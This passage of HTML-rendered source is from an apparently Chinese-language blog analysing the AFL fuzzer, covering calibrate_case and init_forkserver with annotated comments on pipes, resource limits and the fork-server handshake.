punctuation">(</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 不是简单模式、是第一轮运行且未检测到插桩输出</span>      fault <span class="token operator">=</span> FAULT_NOINST<span class="token punctuation">;</span><span class="token comment">//标记为无插桩错误</span>      <span class="token keyword">goto</span> abort_calibration<span class="token punctuation">;</span><span class="token comment">//跳转到 abort_calibration</span>    <span class="token punctuation">&#125;</span>    cksum <span class="token operator">=</span> <span class="token function">hash32</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">,</span> HASH_CONST<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 计算当前覆盖痕迹的哈希值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>exec_cksum <span class="token operator">!=</span> cksum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当前覆盖痕迹的哈希值与之前的哈希值不同或是第一次运行</span>      u8 hnb <span class="token operator">=</span> <span class="token function">has_new_bits</span><span class="token punctuation">(</span>virgin_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检测是否有新的覆盖位</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>hnb <span class="token operator">></span> new_bits<span class="token punctuation">)</span> new_bits <span class="token operator">=</span> hnb<span class="token punctuation">;</span><span class="token comment">// 更新为更高优先级的状态</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>exec_cksum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//原 exec_cksum 不为 0，说明有新路径</span>        u32 i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAP_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 遍历每一个覆盖字节，检查是否有变化</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var_bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> first_trace<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> trace_bits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//该边未标记变异且当前边的统计结果发生变化</span>            var_bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//标记变异</span>            stage_max    <span class="token operator">=</span> CAL_CYCLES_LONG<span class="token punctuation">;</span><span class="token comment">//设置校准次数为 40</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        var_detected <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 标记检测到变异</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//第一次运行</span>        q<span class="token operator">-></span>exec_cksum <span class="token operator">=</span> cksum<span class="token punctuation">;</span><span class="token comment">//更新覆盖痕迹哈希值</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>first_trace<span class="token punctuation">,</span> trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新覆盖痕迹</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  stop_us <span class="token operator">=</span> <span class="token function">get_cur_time_us</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前时间作为结束时间</span>  total_cal_us     <span class="token operator">+=</span> stop_us <span class="token operator">-</span> start_us<span class="token punctuation">;</span><span class="token comment">//相减得到运行时间</span>  total_cal_cycles <span class="token operator">+=</span> stage_max<span class="token punctuation">;</span><span class="token comment">//执行次数</span>  q<span class="token operator">-></span>exec_us     <span class="token operator">=</span> <span class="token punctuation">(</span>stop_us <span class="token operator">-</span> start_us<span class="token punctuation">)</span> <span class="token operator">/</span> stage_max<span class="token punctuation">;</span><span class="token comment">//每次执行时间</span>  q<span class="token operator">-></span>bitmap_size <span class="token operator">=</span> <span class="token function">count_bytes</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//覆盖边的数量</span>  q<span class="token operator">-></span>handicap    <span class="token operator">=</span> handicap<span class="token punctuation">;</span><span class="token comment">//记录障碍</span>  q<span class="token operator">-></span>cal_failed  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 标记此次校准未失败</span>  total_bitmap_size <span class="token operator">+=</span> q<span class="token operator">-></span>bitmap_size<span class="token punctuation">;</span><span class="token comment">//更新总覆盖边的数量</span>  total_bitmap_entries<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//更新产生的 bitmap 数量</span>  <span class="token function">update_bitmap_score</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新位图得分</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dumb_mode <span class="token operator">&amp;&amp;</span> first_run <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>fault <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>new_bits<span class="token punctuation">)</span> fault <span class="token operator">=</span> FAULT_NOBITS<span class="token punctuation">;</span><span class="token comment">// 如果不是简单模式且是第一次运行且未失败且这个用例没有从插桩中得到新的输出则标记为无插桩错误</span>abort_calibration<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>new_bits <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>q<span class="token operator">-></span>has_new_cov<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果发现新路径且之前未记录，更新状态</span>    q<span class="token operator">-></span>has_new_cov <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//标记为有新路径</span>    queued_with_cov<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//发现新路径的 queue 增加</span>  <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var_detected<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果 queue 是可变路径</span>    var_byte_count <span class="token operator">=</span> <span class="token function">count_bytes</span><span class="token punctuation">(</span>var_bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 计算变异边的数量，代表这些tuple具有可变的行为</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token operator">-></span>var_behavior<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果该测试用例变异</span>      <span class="token function">mark_as_variable</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 标记为变异测试用例</span>      queued_variable<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//变异测试用例数量增加</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 恢复之前的阶段信息</span>  stage_name <span class="token operator">=</span> old_sn<span class="token punctuation">;</span>  stage_cur  <span class="token operator">=</span> old_sc<span class="token punctuation">;</span>  stage_max  <span class="token operator">=</span> old_sm<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>first_run<span class="token punctuation">)</span> <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果不是第一次运行，显示统计信息</span>  <span class="token keyword">return</span> fault<span class="token punctuation">;</span><span class="token comment">//返回 fault 值</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h3><ul><li>创建 st_pipe 和 ctl_pipe 管道，fork 获取进程号（父进程的 fork() 返回值是子进程的 PID，子进程的 fork() 返回值是 0）</li><li>在子进程中<ul><li>设置资源限制、地址空间大小限制（设置了 mem_limit 时）、禁用核心转储以加快速度</li><li>起一个新的进程组</li><li>重定向文件描述符 1 &#x2F; 2 到 dev_null_fd，设置了 out_file 则将输入重定向到 dev_null_fd，否则重定向到 out_fd，即把 stdin 重定向到 .cur_input 文件</li><li>将 fd 198 重定向到 ctl_pipe[0] 以接收 supervisor 指令，将 fd 199 重定向到 st_pipe[1] 以向 supervisor 发送回复，子进程只能读取命令和发送写出状态</li><li>关闭子进程里的一些文件描述符</li><li>execve 执行 target_path，程序结束子进程结束，第一个入口点 afl_maybe_log 停下来，给 supervisor 发送 4 字节表示已就绪并等待指令<ul><li>第一个 target 会进入 __afl_maybe_log 里的 __afl_fork_wait_loop，并充当 fork server，在整个 Fuzz 的过程中，它都不会结束，每次要Fuzz 一次 target，都会从这个 fork server fork 出来一个子进程去 fuzz</li></ul></li><li>执行失败则标记失败 EXEC_FAIL_SIG</li></ul></li><li>父进程<ul><li>关闭不需要的管道端点</li><li>获取控制管道，发送控制信号给子进程,只能发送(“写出”)命令；获取状态管道，从子进程接收状态信息,只能读状态</li><li>设置实时计时器，等待 fork server 启动，但限制等待时间</li><li>读取 fork 服务器的状态，停止计时器</li><li>读取到 4 字节说明 fork server 正常</li><li>超时等错误报错退出</li></ul></li></ul><p><img src="/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/cde5344bac4d8a91f7c107e86e8ff1e1.png" alt="在这里插入图片描述"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">EXP_ST <span class="token keyword">void</span> <span class="token function">init_forkserver</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">itimerval</span> it<span class="token punctuation">;</span>  <span class="token keyword">int</span> st_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> status<span class="token punctuation">;</span>  s32 rlen<span class="token punctuation">;</span>  <span class="token function">ACTF</span><span class="token punctuation">(</span><span class="token string">"Spinning up the fork server..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 启动 fork server</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">pipe</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"pipe() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建 st_pipe 和 ctl_pipe 管道</span>  forksrv_pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fork 子进程获取进程号，父进程的 fork() 返回值是子进程的 PID，子进程的 fork() 返回值是 0</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>forksrv_pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>forksrv_pid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//pid = 0，在子进程</span>    <span class="token keyword">struct</span> <span class="token class-name">rlimit</span> r<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getrlimit</span><span class="token punctuation">(</span>RLIMIT_NOFILE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">.</span>rlim_cur <span class="token operator">&lt;</span> FORKSRV_FD <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      r<span class="token punctuation">.</span>rlim_cur <span class="token operator">=</span> FORKSRV_FD <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_NOFILE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 尝试设置资源限制，忽略错误</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果有内存限制</span>      r<span class="token punctuation">.</span>rlim_max <span class="token operator">=</span> r<span class="token punctuation">.</span>rlim_cur <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">rlim_t</span><span class="token punctuation">)</span>mem_limit<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">RLIMIT_AS</span></span>      <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_AS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置地址空间大小限制，忽略错误</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>      <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_DATA<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^RLIMIT_AS */</span></span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>rlim_max <span class="token operator">=</span> r<span class="token punctuation">.</span>rlim_cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">setrlimit</span><span class="token punctuation">(</span>RLIMIT_CORE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 禁用核心转储以加快速度</span>    <span class="token function">setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 起一个新的进程组</span>    <span class="token comment">//重定向文件描述符 1 / 2 到 dev_null_fd</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//设置了 out_file 则将输入重定向到 dev_null_fd</span>      <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//否则重定向到 out_fd，即把 stdin 重定向到 .cur_input 文件</span>      <span class="token function">dup2</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 将 fd 198 重定向到 ctl_pipe[0] 以接收 supervisor 指令</span>    <span class="token comment">// 将 fd 199 重定向到 st_pipe[1] 以向 supervisor 发送回复</span>    <span class="token comment">//子进程只能读取命令和发送写出状态</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关闭子进程里的一些文件描述符</span>    <span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>out_dir_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>dev_urandom_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span><span class="token function">fileno</span><span class="token punctuation">(</span>plot_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_BIND_LAZY"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"LD_BIND_NOW"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"ASAN_OPTIONS"</span><span class="token punctuation">,</span> <span class="token string">"abort_on_error=1:detect_leaks=0:symbolize=0:allocator_may_return_null=1"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"MSAN_OPTIONS"</span><span class="token punctuation">,</span> <span class="token string">"exit_code="</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>MSAN_ERROR<span class="token punctuation">)</span> <span class="token string">":symbolize=0:"</span>                           <span class="token string">"abort_on_error=1:allocator_may_return_null=1:msan_track_origins=0"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execv</span><span class="token punctuation">(</span>target_path<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行 target_path 程序结束子进程结束，在第一个入口点停下来，给 supervisor 发送 4 字节并等待指令</span>    <span class="token comment">//第一个 target 会进入 __afl_maybe_log 里的 __afl_fork_wait_loop，并充当 fork server，在整个 Fuzz 的过程中，它都不会结束，每次要Fuzz 一次 target，都会从这个 fork server fork 出来一个子进程去 fuzz</span>    <span class="token operator">*</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits <span class="token operator">=</span> EXEC_FAIL_SIG<span class="token punctuation">;</span><span class="token comment">//执行失败才会执行到这里，标记失败</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//父进程，关闭不需要的管道端点</span>  <span class="token function">close</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fsrv_ctl_fd <span class="token operator">=</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 控制管道，发送控制信号给子进程,只能发送(“写出”)命令</span>  fsrv_st_fd  <span class="token operator">=</span> st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 状态管道，从子进程接收状态信息,只能读状态</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>exec_tmout <span class="token operator">*</span> FORK_WAIT_MULT<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>exec_tmout <span class="token operator">*</span> FORK_WAIT_MULT<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>it<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置实时计时器，等待 fork server 启动，但限制等待时间</span>  rlen <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读取 fork 服务器的状态</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  it<span class="token punctuation">.</span>it_value<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">setitimer</span><span class="token punctuation">(</span>ITIMER_REAL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>it<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 停止计时器</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>rlen <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//读取到 4 字节说明 fork server 正常，本例中会读到 \x00\x00\x00\x00 后返回</span>    <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"All right - fork server is up."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//超时等错误报错退出</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>child_timed_out<span class="token punctuation">)</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Timeout while initializing fork server (adjusting -t may help)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>forksrv_pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"waitpid() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit <span class="token operator">&amp;&amp;</span> mem_limit <span class="token operator">&lt;</span> <span class="token number">500</span> <span class="token operator">&amp;&amp;</span> uses_asan<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem_limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST           <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST           <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Fork server crashed with signal %d"</span><span class="token punctuation">,</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>u32<span class="token operator">*</span><span class="token punctuation">)</span>trace_bits <span class="token operator">==</span> EXEC_FAIL_SIG<span class="token punctuation">)</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to execute target application ('%s')"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_limit <span class="token operator">&amp;&amp;</span> mem_limit <span class="token operator">&lt;</span> <span class="token number">500</span> <span class="token operator">&amp;&amp;</span> uses_asan<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST           <span class="token punctuation">.</span><span class="token punctuation">.</span>z  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem_limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span> cLRD <span class="token string">"[-] "</span> cRST        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Fork server handshake failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 